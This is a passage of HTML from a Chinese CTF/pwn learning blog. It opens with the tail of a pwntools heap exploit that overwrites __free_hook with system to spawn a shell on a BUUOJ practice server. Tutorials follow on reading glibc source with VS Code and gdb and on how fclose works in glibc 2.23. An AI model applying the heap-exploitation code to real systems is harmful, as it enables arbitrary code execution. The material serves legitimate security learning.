class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete()</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x90</span>,p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x91</span>)+p64(free_hook-<span class="number">8</span>))</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">    delete()</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="comment">#pwn()</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25279</span>)</span><br><span class="line">        <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">        pwn()    </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826111647020-1771891318.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/aec37d93.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/aec37d93.html" class="post-title-link" itemprop="url">glibc中的源码该怎么读</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:51:10" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>在PWN的学习过程中，阅读glibc的源代码是一项必备的技能。一方面而言有些问题需要深入到源码中寻找答案，另一方面阅读源码来探究glibc中函数的实现是再合适不过的方法(有很多师傅做了优秀的总结，可不论怎么阅读他人的总结还是不如自己去实际的探究一下)，最后一方面，在不断探究和学习源码的过程中其实也在不断的进步并打下基础，如此看来阅读glibc中的源码百利而无一害。但我对于第一次尝试阅读源码的印象颇深，无从下手，不知所措。于是乎我写下了这篇文章，来向当初和我一样入门的师傅们提供一些经验和建议。</p>
<p><strong>由于本人水平有限，提供的思路和建议未必是最好的，但应该是当下在我的认知中对我而言是最合适的了。如果有错误或更方便的做法，师傅们也可以提出来。</strong></p>
<h2 id="1、准备环境-amp-工具-amp-源码"><a href="#1、准备环境-amp-工具-amp-源码" class="headerlink" title="1、准备环境&amp;工具&amp;源码"></a>1、准备环境&amp;工具&amp;源码</h2><p>我们需要先把环境和工具准备好，这个其实很好搞。</p>
<p>我们需要去搞一下gdb源码调试的这个功能，尤其是在初学的时候，源码基本每行都看不懂(至少当时我是这样hhh)，那就必须要配合着gdb动态调试看源码了，这样我们可以去看一些变量的值，以及程序的走向又或者函数的调用关系等等。对于最初的萌新来说，这样就舒服很多了。</p>
<p>如何搭建gdb源码调试的环境可以看我的这篇文章  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">here</a></p>
<p>其次就是工具，工具的话建议选择vscode，这个具体咋搞就百度吧。</p>
<p>最后源码在这里下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://launchpad.net/ubuntu/+source/glibc/</span><br></pre></td></tr></table></figure>

<p>里面有很多个版本的glibc，如果没有特殊需要的话最好下载2.23-0ubuntu3这个版本。</p>
<p>最后打开vscode，将刚才下载的glibc的文件打开(说实话正常的话下面两张图片没必要放，因为现在在我看来这些步骤应该是理所当然，但我初学的时候其实连这个都不知道，也算是给曾经的自己看一下吧)</p>
<img src="https://s2.loli.net/2022/08/13/95XpLcSAPbKHMWI.png" alt="image-20220812222510249" style="zoom:50%;" />

<p>glibc中的文件有很多，选择我们需要分析的那个函数所在的文件夹即可。比如我要分析fopen函数，那就打开这个libio这个文件(想知道函数在哪个文件夹的话，百度一下即可)</p>
<p><img src="https://s2.loli.net/2022/08/13/ObFPWU6IGCpvHun.png" alt="image-20220812222621903"></p>
<h2 id="2、vscode的一些快捷键"><a href="#2、vscode的一些快捷键" class="headerlink" title="2、vscode的一些快捷键"></a>2、vscode的一些快捷键</h2><p>要说分析源码，不得不提的就是一些快捷键。使用快捷键和不使用快捷键的效率简直天差地别。</p>
<p>假设我现在在分析代码的1352行，这里出现了_IO_default_xsputn函数，如果我们要查看该函数定义的地方的话，ctrl+左键点击该函数，即可跳转到定义的地方。(如下图)</p>
<p><img src="https://s2.loli.net/2022/08/13/cELKu7FjeRkxwvC.png" alt="image-20220812223435147"></p>
<p>下图是我们已经跳转到函数定义的地方了，但是有一个很难受的事情就是，如果我们想回去刚才的代码继续分析还要手动再找回去么？ 我们可以使用快捷键Alt加&lt;-键(这个&lt;-键就是键盘里那个上下左右键的左)返回到刚刚的代码，同理Alt加-&gt;键可以再回到函数定义的地方。</p>
<img src="https://s2.loli.net/2022/08/13/CRyAYrdj6JwGsQp.png" alt="image-20220812223643803" style="zoom:50%;" />



<p>ctrl+f是在当前文件搜索指定的内容</p>
<p>ctrl+z就是撤回刚刚的一步操作</p>
<h2 id="3、宏-amp-如何溯源解决问题"><a href="#3、宏-amp-如何溯源解决问题" class="headerlink" title="3、宏&amp;如何溯源解决问题"></a>3、宏&amp;如何溯源解决问题</h2><p>在glibc源码分析中，宏定义十分常见(如果不知道什么是宏可以百度一下)</p>
<p>有可能你眼前这个陌生的东西就是个宏。(初学的时候，我看源码一脸懵，心想咋这么多东西我都没见过，我学的假的c语言么？)</p>
<p>以下面432这行代码为例：</p>
<p>发现上来就是一个_IO_size_t干懵萌新，因为之前没见过啊。</p>
<p><img src="https://s2.loli.net/2022/08/13/jeMiwLNGrAVnbHT.png" alt="image-20220812224439901"></p>
<p>我们ctrl+左键溯源一下这个_IO_size_t(如下图)，发现是个宏定义，不过size_t还是没见过呀，那就继续溯源</p>
<p><img src="https://s2.loli.net/2022/08/13/AC95BZto1L7rNge.png" alt="image-20220812224614100"></p>
<p>发现最终是typedef给unsigned __int64新定义了一个名字叫做size_t（不清楚typedef的请自行百度）</p>
<p><img src="https://s2.loli.net/2022/08/13/D1iZ68ECtof495l.png" alt="image-20220812224707086"></p>
<p>这下子unsigned int64我们认识了，这不就是无符号整形变量么，ok问题解决，最初的那行代码其实就是unsigned int64 count 定义了count这个变量，仅此而已。</p>
<p>下面放一个我初学时的问题，下面这个结构体Elf32_Sym为什么是16字节？(我在这里并不是想表达这个结构体是多大，<strong>我是想强调我们在面对不会的问题的时候，解决的思路应该如何</strong>)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word   st_name;      <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr   st_value;     <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word   st_size;      <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;      <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_other;     <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section    st_shndx;     <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<p>这似乎是在定义变量？ 可是没听过Elf32_Word是个变量类型啊。</p>
<p>鼠标右键一下（我当时用的是VisualStudio ，发现是有个转到定义的，就说明这个Elf32_Word也是个被定义的东西</p>
<img src="https://s2.loli.net/2022/08/13/TXZfAaqK5Cg3D2l.png" alt="image-20220301130300184" style="zoom:33%;" />

<p>到定义那里看一下发现了typedef这个东西和uint32_t，奈何c的基础不牢，google一下。</p>
<p><img src="https://s2.loli.net/2022/08/13/QmLDs2RXeESOtof.png" alt="image-20220301130416557"></p>
<p>发现了这个东西其实就是类似于提供了一个自定义类型的功能，举个例子，typedef unsigned int ai;</p>
<p>那么此时的ai就相当于unsigned int这个东西了，因此比如我们想定义一个unsigned int类型的变量b，就可以写成这样了，ai b;此时的效果是和unsigned int b;效果是一样的</p>
<p>那么这个uint32_t又是什么呢？继续google。</p>
<p>发现了这个uint32_t的这个_t的意思是这些数据类型（指的是uint32_t,而并非Elf32_Word）是通过typedef来定义的，而不是新的数据类型。也就是说，他们其实是我们已知的类型的别名。</p>
<p>然后下面这些就是这些数据类型被定义的地方</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">ifndef</span> __int8_t_defined  </span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __int8_t_defined  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">signed</span> <span class="type">char</span> <span class="type">int8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span>	<span class="type">short</span> <span class="type">int</span> <span class="type">int16_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> <span class="type">int32_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __WORDSIZE == 64  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">int</span> <span class="type">int64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span>  </span></span><br><span class="line">__extension__</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="type">int64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> <span class="type">uint8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> <span class="type">uint16_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> __uint32_t_defined  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">uint32_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __uint32_t_defined  </span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> __WORDSIZE == 64  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> <span class="type">uint64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span>  </span></span><br><span class="line">__extension__</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> <span class="type">uint64_t</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br></pre></td></tr></table></figure>

<p>如此再回到这行代码  Elf32_Word	st_name，其实它就等同于unsigned int st_name，此时应该就能够看懂了。</p>
<p>最后回到最开始的那个问题，为什么这个结构是16字节？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word   st_name;      <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr   st_value;     <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word   st_size;      <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_info;      <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>    st_other;     <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section    st_shndx;     <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<p>因为分别查看了定义类型发现Elf32_Word和Elf32_Addr都是unsigned int类型，这个类型是4个字节，而unsigned char是1个字节，而查看了Elf32_Section发现它是被uint16_t定义的，而uint16_t则是unsigned short int类型，为2个字节。因此整个结构体为16字节。</p>
<p><strong>上面两个示例都提供了解决问题的基本思考方式，希望对师傅们有帮助</strong></p>
<h2 id="4、分析一个函数源码首先应该做的是什么？"><a href="#4、分析一个函数源码首先应该做的是什么？" class="headerlink" title="4、分析一个函数源码首先应该做的是什么？"></a>4、分析一个函数源码首先应该做的是什么？</h2><p>我这里提供一个初学者最开始分析源码的一个思路。</p>
<p>以我最初分析fopen函数源码为例，首先肯定是要把vscode打开，确保自己手里有一份源码(而非只看某篇文章出现的源码)，然后先用gdb去调试，这次调试看什么？对于初学者而言，第一次应该是啥都看不懂，那也要硬着头皮把整个函数的汇编指令都si给执行一遍(就最起码对整个函数调用的函数数量，哪些出现频率高的函数起码有个印象)，然后第二次在把整个函数的汇编指令都si给执行一遍，这次去观察并记录期间调用的函数关系(最好是拿图画下来)，看不懂函数关系也没事，但至少要去画一遍或者写一遍。(就如下图这样)</p>
<p><img src="https://s2.loli.net/2022/08/13/LTdExvIBYAWhaeZ.png" alt="image-20220813082114252"></p>
<p>现在我们已经通过自己的调试有了一份“地图”，然后开始对着vscode源码开始从头分析。因为刚开始肯定有很多地方都不懂，那我们所谓的分析就会变的异常困难，<strong>我们可以先试着预测函数的走向以及执行后可能的结果。</strong></p>
<p>举个最简单的例子:</p>
<p>下面的代码就是fopen函数的最开始部分，发现在69行执行了malloc函数，那我们就可以<del>猜测</del>推断__fopen_internal函数就会调用malloc函数，而malloc申请的内存大小应该是locked_FILE结构体的大小，而返回的地址则给了new_f。(如下图)</p>
<img src="https://s2.loli.net/2022/08/13/89enG1XHJkFdirb.png" alt="image-20220813082708464" style="zoom:50%;" />

<p>因为是初学时的源码分析，我们并不能保证百分百是这样的，那我们就用动态调试来看看是不是这样的，发现动态调试到这里，确实执行到了这里。</p>
<p><img src="https://s2.loli.net/2022/08/13/HSQ13JrKZWyxwER.png" alt="image-20220813083404379"></p>
<p>我们执行这行代码后再看下locked_FILE结构体的大小(如下)，因此判断申请的堆块大小最终为0x231(0x220+0x10+0x1)</p>
<p><img src="https://s2.loli.net/2022/08/13/wyGRTcgW2NbDqmu.png" alt="image-20220813083513162"></p>
<p><img src="https://s2.loli.net/2022/08/13/AJKH4MogpXh3GtS.png" alt="image-20220813083643376"></p>
<p>而new_f的值应该是malloc返回的堆块的用户区地址。(如下)</p>
<p><img src="https://s2.loli.net/2022/08/13/iMSIPThdeqc16U2.png" alt="image-20220813083753980"></p>
<p>至此我们就完成了一次最简单的验证。</p>
<p>而之后的流程也大致如此，先看源码分析，如果源码看懂了那就配合动态调试看看是否是自己分析的那样，如果源码没看懂，就直接动态调试看看函数是怎么执行的。对于初学者而言刚开始可能会比较困难，可以去网上找一些师傅已经做过的源码分析来作为参考，这样遇到实在分析不懂的地方，就看看其他师傅是怎么分析的。</p>
<h2 id="5、善于用搜索引擎"><a href="#5、善于用搜索引擎" class="headerlink" title="5、善于用搜索引擎"></a>5、善于用搜索引擎</h2><p>现在许多常见的问题其实很多都可以在师傅们的文章中找到答案，如果遇到自己不会的问题，可以尝试在百度或者google上搜索(如果有条件的话，最好还是用google)。</p>
<h2 id="6、总结函数的调用流程"><a href="#6、总结函数的调用流程" class="headerlink" title="6、总结函数的调用流程"></a>6、总结函数的调用流程</h2><p>为了确保自己是真的熟悉了函数整个的调用流程，建议调试过之后，自己在不看源码的情况下，将函数的调用流程总结一遍。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/b5738aac.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/b5738aac.html" class="post-title-link" itemprop="url">IO学习--源码分析fclose函数</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:50:20" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95-%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">源码调试&&分析</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>之前分析的三个函数文章链接:</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16567446.html">IO学习–源码调试fopen函数</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16575066.html">IO学习–源码分析fread函数</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16578093.html">IO学习–源码分析fwrite函数</a></p>
<p>这篇是IO函数源码分析四部曲中的最后一个fclose函数(并不是以后不分析了，说实话我感觉分析源码去看看我们平常使用的函数到底是怎么实现的，这个过程很有意思，因此以后有机会的话会再调试一些其他函数，花了四天分析了这四个函数，从最开始分析fopen函数源码的时候懵懵逼逼(那篇文章我基本是纯配合着动态调试才搞懂的整体逻辑)，到分析fread函数时对reserve area以及输入和输出缓冲区有了认识，再到基本是对着源码分析的fwrite函数(也是配合着动态调试，不过此时就是静态分析源码为主了)，最后到分析fclose函数源码时感觉的异常顺利和自然。真的是分析每个函数时都有不同的感受。</p>
<p>emmm，感慨有些多了，下面进入正文。</p>
<h2 id="整体流程："><a href="#整体流程：" class="headerlink" title="整体流程："></a>整体流程：</h2><p>下面是fclose函数的整体流程，其他师傅如果分析的时候，可以参考下图。</p>
<img src="https://s2.loli.net/2022/08/12/QDBqLfxORoUMbH8.png" alt="image-20220812201040809" style="zoom:50%;" />

<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码:"></a>源代码:</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> value[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> new[<span class="number">30</span>]=<span class="string">&quot;nice-day&quot;</span>;</span><br><span class="line">    FILE* fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;wt+&quot;</span>);</span><br><span class="line">    fwrite(new,<span class="number">1</span>,<span class="number">10</span>,fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>本文的源代码以及调试的程序所依赖的libc都为2.23版本的</strong></p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析:"></a>源码分析:</h2><p>先看第一部分，经过一些寻常检查后，去调用了_IO_un_link 函数。在fopen函数中新创建了_IO_FILE结构体，将其链入了_IO_list_all链表，而这个_IO_un_link 函数则是将fopen函数中创建的_IO_FILE结构体脱链（代码如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">	······</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="脱链部分"><a href="#脱链部分" class="headerlink" title="脱链部分"></a>脱链部分</h3><p>下面是_IO_un_link函数的源码，整体也很好分析。就是先去判断我们要脱链的这个_IO_FILE结构体是否为链表的头指针。如果是的话执行<code>_IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-&gt;file._chain</code>来脱链（代码如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> **<span class="title">f</span>;</span></span><br><span class="line">	......</span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">	;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">	  ++_IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">	......</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>如果要脱链的结构体不是链表头指针的话，就去遍历整个链表，去找到需要脱链的那个结构体，然后再脱链(代码如下)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  <span class="keyword">if</span> (*f == (_IO_FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>



<h3 id="刷新输出缓冲区"><a href="#刷新输出缓冲区" class="headerlink" title="刷新输出缓冲区"></a>刷新输出缓冲区</h3><p>脱链之后，调用了_IO_file_close_it函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_acquire_lock (fp);</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">  status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure>



<p>_IO_new_file_close_it函数中显示判断了一下文件是否有写的权限，如果有的话就调用_IO_do_flush函数来刷新输出缓冲区。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_close_it (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> write_status;</span><br><span class="line">  <span class="keyword">if</span> (!_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="number">0</span>)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">	·······</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>_IO_do_flush是宏定义，调用了_IO_do_write函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  _IO_do_write(_f, (_f)-&gt;_IO_write_base,				      \</span></span><br><span class="line"><span class="meta">	       (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</span></span><br></pre></td></tr></table></figure>

<p>_IO_do_write函数对输出缓冲区的剩余部分（也就是宏定义中的(_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base）进行了判断，如果输出缓冲区为0的话就直接返回，如果输出缓冲区中有数据的话就调用new_do_write函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>new_do_write函数主要做了两件事，第一执行了系统调用write将输出缓冲区中的数据都读到了文件中。第二就是重置了_IO_write_ptr指针(这两个操作就意味着刷新了输出缓冲区)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">	......</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="系统调用close"><a href="#系统调用close" class="headerlink" title="系统调用close"></a>系统调用close</h3><p>而后随着new_do_write函数的返回，程序再次返回到_IO_new_file_close_it中，此时调用了vtable中的_IO_file_close函数(这个函数就不再说了，就是系统调用了一下close)，然后至此的话主要就剩申请的reserve area区域以及申请出来存放_IO_FILE结构体的内存还没有释放。</p>
